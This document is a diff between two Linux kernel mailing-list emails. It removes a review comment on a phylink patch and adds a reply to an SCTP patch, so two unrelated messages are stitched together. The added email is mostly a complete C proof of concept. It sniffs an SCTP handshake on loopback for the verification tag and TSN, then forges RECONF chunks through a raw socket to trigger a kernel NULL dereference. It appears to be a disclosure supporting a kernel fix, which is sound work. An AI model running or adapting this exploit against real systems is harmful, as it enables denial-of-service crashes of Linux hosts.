@@ -1,71 +1,414 @@
-Received: from vps0.lunn.ch (vps0.lunn.ch [156.67.10.101])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-ed1-f50.google.com (mail-ed1-f50.google.com [209.85.208.50])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E26BF493636;
-	Sat, 22 Aug 2026 17:30:32 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=156.67.10.101
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1787419834; cv=none; b=G+ubeBYz1om3H9dfksjYM+l30qZq2X5+9cCkFFqMsvH2CG7m3RnCYBTKyoL22wsVsPIDe7Xu+Z6XDbSyBt8HnDkvAkO873nSvveFo9OAyU2mPmN+Ix2jHMlS2rcqvWyxh6RFODcSfa0uENylzrGoYUfkPBoDFUdrX1qvseePawk=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1787419834; c=relaxed/simple;
-	bh=ilXRyyPepSfCs5KePItU5VWlcXkmgIW85riIzKWvsmE=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=fupl9LGaDWMBHywuTHrmP5ApanD6Pg9fNdHf5PfrBBYtIOtyGWpQasDxyNkMltdHPs2TvycUg5UrzPWjOisvaRHZtAoJtWFFLBrRe3kWktCYIhDAyMTtM9pXt9p3Mt0mucEGHwRcMrWCG504Aser9NLAg85qzmDxCpPjF9WmdNc=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=lunn.ch; spf=pass smtp.mailfrom=lunn.ch; dkim=pass (1024-bit key) header.d=lunn.ch header.i=@lunn.ch header.b=OiC5shAI; arc=none smtp.client-ip=156.67.10.101
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=lunn.ch
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=lunn.ch
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A74A530E82B
+	for <netdev@vger.kernel.org>; Sat, 22 Aug 2026 17:31:52 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.208.50
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1787419914; cv=pass; b=dGu27Li/S/viODSmohgYraN2D303Cus0fWyAcWXt/mdYTHWk0WikATtPcqkLgIim1Fjdj9UkLFZFlQQgXt8FmvrZvCAhTyIERybfkV2JMQG17ZzLYQ8zYfc7qdrUbXkL+fonB2No9CKDukmFsJDspuh6w2eM9xkP48xStkmmAzU=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1787419914; c=relaxed/simple;
+	bh=7MDFWfOnZsF67puZ2k4BHU9e9iMiVVTUpAYuM5YAEDk=;
+	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
+	 To:Cc:Content-Type; b=IAfoH2mq+FYhHq56xDUHuzyvW5tdfHz1lb4QS9myEnM2JzzGoUlCXFra93QqeZoj8P0mDOHBdjmKGYMT02vciYwkusFPcpUmTdikyaHnJkQT2OZ7C8fZe+5PfZNi282kfZPt+ovfczzQ/UUE6DhakWg3p1mAXAnQ1kJaKrGXgbQ=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=HgfbEnam; arc=pass smtp.client-ip=209.85.208.50
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=lunn.ch header.i=@lunn.ch header.b="OiC5shAI"
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=lunn.ch;
-	s=20171124; h=In-Reply-To:Content-Disposition:Content-Type:MIME-Version:
-	References:Message-ID:Subject:Cc:To:From:Date:From:Sender:Reply-To:Subject:
-	Date:Message-ID:To:Cc:MIME-Version:Content-Type:Content-Transfer-Encoding:
-	Content-ID:Content-Description:Content-Disposition:In-Reply-To:References;
-	bh=x6Z0v5LOtV4HD1MxB1uouNNJOqh6vVSdo9Um1I1YBqo=; b=OiC5shAIn0NIaaE3xcUTgYORcB
-	PCWQ0dJ3BmCg0EPkfds8UdjuV7LLkLE9LbxMcyJj39UpVyLnxoSLmruEI+CqhzJ7lOanhd8X0GFYJ
-	h6yO35yCBBSmx+SrzyxWQu9Y2FSvwjRWjUO/LiwtEu0imU9HJ7ze4wVakkzt+rBZRyYo=;
-Received: from andrew by vps0.lunn.ch with local (Exim 4.94.2)
-	(envelope-from <andrew@lunn.ch>)
-	id 1wxpXt-0012x1-Vq; Sat, 22 Aug 2026 19:30:17 +0200
-Date: Sat, 22 Aug 2026 19:30:17 +0200
-From: Andrew Lunn <andrew@lunn.ch>
-To: Aleksei Sviridkin <f@lex.la>
-Cc: Vladimir Oltean <olteanv@gmail.com>,
-	Heiner Kallweit <hkallweit1@gmail.com>,
-	Russell King <linux@armlinux.org.uk>,
-	"David S . Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@google.com>,
-	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>,
-	Simon Horman <horms@kernel.org>, netdev@vger.kernel.org,
-	linux-kernel@vger.kernel.org
-Subject: Re: [PATCH net-next 1/3] net: phylink: unwind the PHY binding when
- bringup fails late
-Message-ID: <7da05cd4-be4c-499a-ac90-2add64e48b92@lunn.ch>
-References: <20260822155259.87146-1-f@lex.la>
- <20260822155259.87146-2-f@lex.la>
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="HgfbEnam"
+Received: by mail-ed1-f50.google.com with SMTP id 4fb4d7f45d1cf-6a0a4a28cbdso3791660a12.3
+        for <netdev@vger.kernel.org>; Sat, 22 Aug 2026 10:31:52 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1787419911; cv=none;
+        d=google.com; s=arc-20260327;
+        b=JXPs5PrOMBfCWGEALXnbw8IZSC3/1B2ZWlZDJQXfsrDQAEXtEppm5V4IPNQ9Y4SHfG
+         pNGSeFStfkZMbY/2mXMdAsI7v6PTZGM2iyf14g8BsEhYLJIiAFZ4CrO1xYok3nWVpy/M
+         5dR7SWR2HjXdEOFplda9vlML7luCHx6yawyFVVAs8sFUAqJkLGV0SxPGN2MGrbl6qCW8
+         IrS+q0cY+uO6+BOPiSy8nn5yqCwwCCgxKlKZSGvFeUnm1PXvzytSqdmtjh/lJbc/Y/Vl
+         2iR4RQM0oxf6hOSLwAyWj65UKKQ4eCBRTiI5UDP2wCaEDZqeYRyKVKiV3ot77JxryGzg
+         aVHQ==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
+        h=cc:to:subject:message-id:date:from:in-reply-to:references
+         :mime-version:dkim-signature;
+        bh=6IKaBnZCyDIqhyNX7268n/JZWhcc3H9eBtv5K09KbEE=;
+        fh=Z/rmt6qngXLHLoI0x8tuBPrZHLBzeP/nkDXdQqdGANQ=;
+        b=C7rkX1unl1uTUO4DPGsussfp+KPPdIIZBLKNSGnI3gCaruSwoUnlWnB+MRlIyNevjJ
+         nEcnAQb8Iu1abb61IasXrA9KAfOIZ9QR8gJnP0OoA/6KUMuE0h+Xc9dRVEQ+QCr2iQSJ
+         H+AwDcFCbOBUyt7ZA5Je0XBAjTyGsFP2z6n9Gt56h60lNIKzZfPLFoPMK6bRyeGIGjOV
+         zunvy+iSclTx/olkwKfx6VluH9lEm/Dv+fNl4Q+qtQH67Q6K+6dpUAYrAMntgBD71DoR
+         1k5RZgqvmGREE9G2qhWnAK+8ah54x7O94V5a7AtzuiDUrJDwVn43g9dKGBsJzvCIkD84
+         wedw==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1787419911; x=1788024711; darn=vger.kernel.org;
+        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
+         :references:mime-version:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=6IKaBnZCyDIqhyNX7268n/JZWhcc3H9eBtv5K09KbEE=;
+        b=HgfbEnamF1rVN6BakE6N4aIh1JA+XCQmTsrFltKIdb4SZUY5huSp2DUyWxGKbZz3gO
+         2Qj4STm/PvLvxwJMh9JtHhkE58UIAP6ghosIuh1vpKj6E/eocujVLSVMCrpyhGUdvHu3
+         ZAeYuhBx6xVMsWA66sUdltKvmpsfCkGUkW+ObqnkYeW1OoFCVXwQVL3LS8sfuuQ1IU5K
+         rHgEGo2N/g4yw8s9oLa7FkGZWSymAjWk9LKtKEElAN3EqMsIHO3f3cIwlZP6prpnt7Yr
+         aeb7attt5LhssnBIGGJoOZbJZdYPtEU/SvNe7yKWyWBZhN6+HPuTe3z0PoYWcmRLQDcI
+         5w/w==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1787419911; x=1788024711;
+        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
+         :references:mime-version:x-gm-gg:x-gm-message-state:from:to:cc
+         :subject:date:message-id:reply-to:content-type;
+        bh=6IKaBnZCyDIqhyNX7268n/JZWhcc3H9eBtv5K09KbEE=;
+        b=eitUIEjh6A6Y/fxia5+f/ruLoRdWkVy6UIzN+ADfVOyr+PhSRZi48FLz2VkU1X+wJA
+         RhRdOZhmUh0pJaQ0BPlSRsTcrjeqnd4MlWqKPEHm0r+i5dLHTHdY6OP8+a6+tYkzsEbN
+         H1NVfrSDTt1eRpqnSGQPQjk8ENGjlqVgZ/kqroJ2sUF1b3+XYA+x9yuAj07Zrpi4Q4mF
+         3VAlCvZEutmPzyKwhTpGTqEfdC+9JHn23yanFNIeFNA8zMskjU/7JbjysJz8pNHmwgqV
+         qC9hQtpsX+I9coKvFMG3o0l32no5tiE5Ekr3Uy1j0v/210z/7lZSNgWXp/ZEss1TwFKV
+         AXFQ==
+X-Forwarded-Encrypted: i=1; AHgh+RoGjXSD2lLdqbtKMsOgYNDCVdrJleX9iQSHWBtUuyce9/rR/ZOmf8Tlx/6cNLMydLsoOfzIJ5I=@vger.kernel.org
+X-Gm-Message-State: AFuF++ndprMyl990DexKh17FQpJdTcWXNLhkWu6xFc9fMa1WClUiBw6Y
+	fgdsebp3Hb6xddm4b8Gevgd+TbYezVfYSm6HD4it5LnjeUts0oKCC0edRSr94o4e1AcS/zHmmA3
+	lM9s60m0kzvCUpFhGNnKoKvfgyksYeeA=
+X-Gm-Gg: AR+sD11/IdzzqmlEdi+5zAKgR0a45AbdjYFjxAhLJKJmQrLoFZ8e16wnD2HHezmthPa
+	zPI4nfl6qBONOZG1McMREzXpRYcG1PNhJChM6OHQNNDhOnyjKdzOPlOySLmQ3BJlbc23hQZORcr
+	dh5R1UTeek61gBQpsRkGBMrWlhVCdZYAxtuziKs8n9iB2JTia3DeZuGlgrsxKxdKeFSLG7Hi+43
+	860YAA6dMF7hGVHtSF815tFDOnC/K/h1mVODQGlsvw67MHSv8H9mQskujmxq8QpFYRtQvdIQ+Qd
+	Ovsyc+VHBFwElMGNCxONb6oEckEe8nTb0ucVFycsbnlPt7gr4ohcHAxytsaQyi2oHFRlrxPCqIc
+	=
+X-Received: by 2002:a05:6402:5049:b0:6a3:f63a:4997 with SMTP id
+ 4fb4d7f45d1cf-6a582af9535mr7971615a12.3.1787419910548; Sat, 22 Aug 2026
+ 10:31:50 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20260822155259.87146-2-f@lex.la>
+References: <20260822172352.63025-3-bestswngs@gmail.com>
+In-Reply-To: <20260822172352.63025-3-bestswngs@gmail.com>
+From: Weiming Shi <bestswngs@gmail.com>
+Date: Sun, 23 Aug 2026 01:31:12 +0800
+X-Gm-Features: AcwNN1UwfaN46iu3pn8qlCUJA7Cs0hG5N3p59x0bMbVmrRjNA9Z9dsAP0MrRTM8
+Message-ID: <CANgPUi29bRnTJNZfTcr6uc0pB88px9BDuNWJV5Co+c9k+g9_Ug@mail.gmail.com>
+Subject: Re: [PATCH net v2] sctp: fix NULL deref on untransmitted RECONF completion
+To: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>, Xin Long <lucien.xin@gmail.com>, 
+	"David S . Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, 
+	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>
+Cc: linux-sctp@vger.kernel.org, netdev@vger.kernel.org, 
+	linux-kernel@vger.kernel.org, Xiang Mei <xmei5@asu.edu>, stable@vger.kernel.org
+Content-Type: text/plain; charset="UTF-8"
 
-> +	if (ret) {
-> +		mutex_lock(&pl->phydev_mutex);
-> +		mutex_lock(&phy->lock);
-> +		mutex_lock(&pl->state_mutex);
-> +		pl->phydev = NULL;
-> +		pl->phy_enable_tx_lpi = false;
-> +		pl->mac_tx_clk_stop = false;
-> +		mutex_unlock(&pl->state_mutex);
-> +		mutex_unlock(&phy->lock);
-> +		mutex_unlock(&pl->phydev_mutex);
-> +	}
+Reproduction Steps:
 
-This is the same as the inner part of phylink_disconnect_phy(). Maybe
-pull it out into a helper?
+1. Requirements
+```
+CONFIG_IP_SCTP=y
+CONFIG_PACKET=y
+```
 
-     Andrew
+2. PoC
+```c
+#define _GNU_SOURCE
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <stdarg.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define IPPROTO_SCTP_           132
+#define SOL_SCTP_               132
+#define SCTP_RECONFIG_SUPPORTED_ 117
+#define SCTP_ENABLE_STREAM_RESET_ 118
+#define SCTP_ENABLE_RESET_STREAM_REQ_ 0x01
+
+#define SCTP_CID_INIT           1
+#define SCTP_CID_INIT_ACK       2
+#define SCTP_CID_RECONF         0x82
+
+#define P_RESET_OUT_REQUEST     0x000d
+#define P_RESET_IN_REQUEST      0x000e
+#define P_RESET_RESPONSE        0x0010
+
+#define SRV_PORT                29899
+
+struct sctp_assoc_value_ {
+        int assoc_id;
+        uint32_t assoc_value;
+};
+
+static void die(const char *fmt, ...)
+{
+        va_list ap;
+
+        va_start(ap, fmt);
+        vfprintf(stderr, fmt, ap);
+        va_end(ap);
+        fprintf(stderr, ": %s\n", strerror(errno));
+        exit(1);
+}
+
+static void say(const char *fmt, ...)
+{
+        va_list ap;
+
+        va_start(ap, fmt);
+        vprintf(fmt, ap);
+        va_end(ap);
+        printf("\n");
+        fflush(stdout);
+}
+
+/* CRC32c (Castagnoli), reflected, as used for the SCTP checksum. */
+static uint32_t crc32c(const uint8_t *buf, size_t len)
+{
+        static uint32_t tab[256];
+        static int done;
+        uint32_t crc = 0xffffffffu;
+        size_t i;
+
+        if (!done) {
+                for (i = 0; i < 256; i++) {
+                        uint32_t c = (uint32_t)i;
+                        int k;
+
+                        for (k = 0; k < 8; k++)
+                                c = (c & 1) ? (c >> 1) ^ 0x82f63b78u : c >> 1;
+                        tab[i] = c;
+                }
+                done = 1;
+        }
+
+        for (i = 0; i < len; i++)
+                crc = tab[(crc ^ buf[i]) & 0xff] ^ (crc >> 8);
+
+        return crc ^ 0xffffffffu;
+}
+
+static void put16(uint8_t *p, uint16_t v) { uint16_t t = htons(v);
+memcpy(p, &t, 2); }
+static void put32(uint8_t *p, uint32_t v) { uint32_t t = htonl(v);
+memcpy(p, &t, 4); }
+
+/*
+ * Drain the AF_PACKET tap and pull out
+ *   - the initial TSN from the INIT we sent          (peer's strreset_inseq)
+ *   - the initiate tag from the INIT-ACK we received (vtag for our packets)
+ */
+static int harvest_handshake(int tap, uint16_t cport, uint32_t *init_tsn,
+                             uint32_t *peer_vtag)
+{
+        int got_tsn = 0, got_vtag = 0;
+        uint8_t buf[2048];
+
+        for (;;) {
+                ssize_t n = recv(tap, buf, sizeof(buf), MSG_DONTWAIT);
+                const uint8_t *ip, *sctp, *chunk;
+                unsigned int ihl;
+                uint16_t sport, dport;
+
+                if (n < 0) {
+                        if (errno == EAGAIN || errno == EWOULDBLOCK)
+                                break;
+                        die("tap recv");
+                }
+                if (n < (ssize_t)(sizeof(struct iphdr) + 12 + 4))
+                        continue;
+
+                ip = buf;
+                if ((ip[0] >> 4) != 4 || ip[9] != IPPROTO_SCTP_)
+                        continue;
+                ihl = (ip[0] & 0x0f) * 4;
+                if (n < (ssize_t)(ihl + 12 + 4 + 16))
+                        continue;
+
+                sctp = ip + ihl;
+                memcpy(&sport, sctp + 0, 2); sport = ntohs(sport);
+                memcpy(&dport, sctp + 2, 2); dport = ntohs(dport);
+                chunk = sctp + 12;
+
+                /* INIT we emitted: fixed part is
+tag/a_rwnd/nout/nin/initial_tsn */
+                if (chunk[0] == SCTP_CID_INIT && sport == cport &&
+                    dport == SRV_PORT && !got_tsn) {
+                        memcpy(init_tsn, chunk + 4 + 12, 4);
+                        *init_tsn = ntohl(*init_tsn);
+                        got_tsn = 1;
+                }
+
+                /* INIT-ACK from the victim: its initiate tag is our vtag */
+                if (chunk[0] == SCTP_CID_INIT_ACK && sport == SRV_PORT &&
+                    dport == cport && !got_vtag) {
+                        memcpy(peer_vtag, chunk + 4, 4);
+                        *peer_vtag = ntohl(*peer_vtag);
+                        got_vtag = 1;
+                }
+        }
+
+        return got_tsn && got_vtag;
+}
+
+int main(int argc, char **argv)
+{
+        struct sockaddr_in srv = { 0 }, cli = { 0 };
+        uint32_t init_tsn = 0, peer_vtag = 0;
+        int lfd, cfd, afd, tap, raw, one = 1;
+        struct sctp_assoc_value_ av;
+        struct sockaddr_ll ll = { 0 };
+        socklen_t slen;
+        uint8_t pkt[64];
+        int multichunk;
+        uint16_t cport;
+        size_t paylen;
+        uint32_t ck;
+        uint8_t *c;
+
+        multichunk = (argc > 1 && !strcmp(argv[1], "multichunk"));
+
+        srv.sin_family = AF_INET;
+        srv.sin_port = htons(SRV_PORT);
+        srv.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+
+        /* ---- victim endpoint ------------------------------------------- */
+        lfd = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP_);
+        if (lfd < 0)
+                die("socket(SCTP) -- is the sctp module loaded?");
+        if (setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
+                die("SO_REUSEADDR");
+
+        av.assoc_id = 0;
+        av.assoc_value = 1;
+        if (setsockopt(lfd, SOL_SCTP_, SCTP_RECONFIG_SUPPORTED_, &av,
+sizeof(av)) < 0)
+                die("victim SCTP_RECONFIG_SUPPORTED");
+        av.assoc_value = SCTP_ENABLE_RESET_STREAM_REQ_;
+        if (setsockopt(lfd, SOL_SCTP_, SCTP_ENABLE_STREAM_RESET_, &av,
+sizeof(av)) < 0)
+                die("victim SCTP_ENABLE_STREAM_RESET");
+
+        if (bind(lfd, (struct sockaddr *)&srv, sizeof(srv)) < 0)
+                die("bind");
+        if (listen(lfd, 4) < 0)
+                die("listen");
+        say("[*] victim listening on 127.0.0.1:%d (reconf + stream
+reset on)", SRV_PORT);
+
+        /* ---- tap loopback before the handshake -------------------------- */
+        tap = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_IP));
+        if (tap < 0)
+                die("AF_PACKET socket");
+        ll.sll_family = AF_PACKET;
+        ll.sll_protocol = htons(ETH_P_IP);
+        ll.sll_ifindex = if_nametoindex("lo");
+        if (!ll.sll_ifindex)
+                die("if_nametoindex(lo)");
+        if (bind(tap, (struct sockaddr *)&ll, sizeof(ll)) < 0)
+                die("bind tap");
+
+        /* ---- attacker association --------------------------------------- */
+        cfd = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP_);
+        if (cfd < 0)
+                die("client socket");
+        av.assoc_id = 0;
+        av.assoc_value = 1;
+        if (setsockopt(cfd, SOL_SCTP_, SCTP_RECONFIG_SUPPORTED_, &av,
+sizeof(av)) < 0)
+                die("client SCTP_RECONFIG_SUPPORTED");
+
+        if (connect(cfd, (struct sockaddr *)&srv, sizeof(srv)) < 0)
+                die("connect");
+        afd = accept(lfd, NULL, NULL);
+        if (afd < 0)
+                die("accept");
+
+        slen = sizeof(cli);
+        if (getsockname(cfd, (struct sockaddr *)&cli, &slen) < 0)
+                die("getsockname");
+        cport = ntohs(cli.sin_port);
+        say("[*] association established, client port %u", cport);
+
+        if (!harvest_handshake(tap, cport, &init_tsn, &peer_vtag)) {
+                fprintf(stderr, "could not recover TSN/vtag from the tap\n");
+                return 1;
+        }
+        say("[*] harvested initial_tsn=0x%08x peer_vtag=0x%08x",
+init_tsn, peer_vtag);
+
+        /* ---- forge the RECONF chunk -------------------------------------- */
+        memset(pkt, 0, sizeof(pkt));
+        put16(pkt + 0, cport);          /* source port      */
+        put16(pkt + 2, SRV_PORT);       /* destination port */
+        put32(pkt + 4, peer_vtag);      /* verification tag */
+        /* pkt + 8: checksum, filled in below */
+
+        c = pkt + 12;
+
+        if (multichunk) {
+                /* chunk #1: parks the reply, still corked */
+                c[0] = SCTP_CID_RECONF;
+                c[1] = 0;
+                put16(c + 2, 4 + 8);
+                put16(c + 4 + 0, P_RESET_IN_REQUEST);
+                put16(c + 4 + 2, 8);
+                put32(c + 4 + 4, init_tsn);
+
+                c += 12;
+                c[0] = SCTP_CID_RECONF;
+                c[1] = 0;
+                put16(c + 2, 4 + 12);
+                put16(c + 4 + 0, P_RESET_RESPONSE);
+                put16(c + 4 + 2, 12);
+                put32(c + 4 + 4, 0);
+                put32(c + 4 + 8, 0);
+
+                paylen = 12 + 12 + 16;
+        } else {
+                c[0] = SCTP_CID_RECONF;
+                c[1] = 0;
+                put16(c + 2, 4 + 8 + 16 + 12);
+
+                put16(c + 4 + 0, P_RESET_IN_REQUEST);
+                put16(c + 4 + 2, 8);
+                put32(c + 4 + 4, init_tsn);
+
+                put16(c + 12 + 0, P_RESET_OUT_REQUEST);
+                put16(c + 12 + 2, 16);
+                put32(c + 12 + 4, init_tsn + 1);
+                put32(c + 12 + 8, 0);
+                put32(c + 12 + 12, 0);
+
+                put16(c + 28 + 0, P_RESET_RESPONSE);
+                put16(c + 28 + 2, 12);
+                put32(c + 28 + 4, 0);
+                put32(c + 28 + 8, 0);
+
+                paylen = 12 + 4 + 8 + 16 + 12;
+        }
+
+        ck = crc32c(pkt, paylen);
+        memcpy(pkt + 8, &ck, 4);                /* little endian on the wire  */
+
+        raw = socket(AF_INET, SOCK_RAW, IPPROTO_SCTP_);
+        if (raw < 0)
+                die("raw socket (need CAP_NET_RAW)");
+
+        say("[*] injecting %s", multichunk ?
+            "two RECONF chunks in one packet: [IN_REQUEST] [RESPONSE]" :
+            "one RECONF chunk: [IN_REQUEST, OUT_REQUEST, RESPONSE]");
+        if (sendto(raw, pkt, paylen, 0,
+                   (struct sockaddr *)&srv, sizeof(srv)) < 0)
+                die("sendto");
+
+        sleep(2);
+        say("[*] survived -- no crash");
+        (void)afd;
+        return 0;
+}
+```
